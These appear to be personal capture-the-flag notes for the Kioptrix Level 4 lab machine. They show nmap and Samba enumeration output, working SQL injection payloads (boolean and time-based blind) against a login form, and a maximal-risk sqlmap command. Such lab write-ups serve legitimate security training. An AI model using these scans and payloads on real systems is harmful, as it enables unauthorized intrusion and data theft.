```
192.168.56.101
```
## Nmap Results
<pre style="font-size: 12px";>
$ nmap -p- -sV -sT -A 192.168.56.101
PORT    STATE SERVICE     VERSION
<font color=red>22</font>/tcp  open  ssh         <font color=red>OpenSSH 4.7p1</font> Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
<font color=red>80</font>/tcp  open  http        Apache httpd<font color=red> 2.2.8</font> ((Ubuntu) <font color=red>PHP/5.2.4-2</font>ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
<font color=red>139</font>/tcp open  netbios-ssn<font color=red> Samba smbd 3.X - 4.X</font> (workgroup: WORKGROUP)
<font color=red>445</font>/tcp open  netbios-ssn <font color=red>Samba smbd 3.0.28a</font> (workgroup: WORKGROUP)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 2h49m42s, median: 0s
| smb-security-mode:
|   <font color=red>account_used: guest</font>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2022-07-27T07:44:42-04:00
</pre>

## Samba Enumeration
https://nsa.guide/content/3-walk-throughs/VulnHub/kioptrix_lv1/0-enumeration.html#kioptrix-level-1-samba-enumeration
<pre style="font-size: 12px";>
$ smbclient -L //192.168.56.101/ -U guest%
color=gray># you have to specify the protocol version</font>
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KIOPTRIX4
</pre>

<pre style="font-size: 12px";>
$ enum4linux 192.168.56.101 | tee output
</pre>

<pre style="font-size: 12px";>
$ nmap -sV --script=smb-enum-shares -p445,139 192.168.56.101
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-27 08:45 EDT
Nmap scan report for 192.168.56.101 (192.168.56.101)
Host is up (0.00081s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\192.168.56.101\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Kioptrix4 server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     <font color=red>Path: C:\tmp</font>
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.56.101\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
</pre>

<pre style="font-size: 12px";>
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: myusername=john&mypassword=-2225' OR 6464=6464-- FliK&Submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=john&mypassword=asd' AND (SELECT 6588 FROM (SELECT(SLEEP(5)))Jysx)-- FJfS&Submit=Login
    
[10:11:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 5.0.12
</pre>

<pre style="font-size: 12px";>
sqlmap -r john -p "mypassword" --risk=3 --level=5 --all
</pre>

check: `home/kali/.local/share/sqlmap/output/192.168.56.101/`
## Resource
1. https://bond-o.medium.com/vulnhub-kioptrix-level-4-bc4184a79eeb
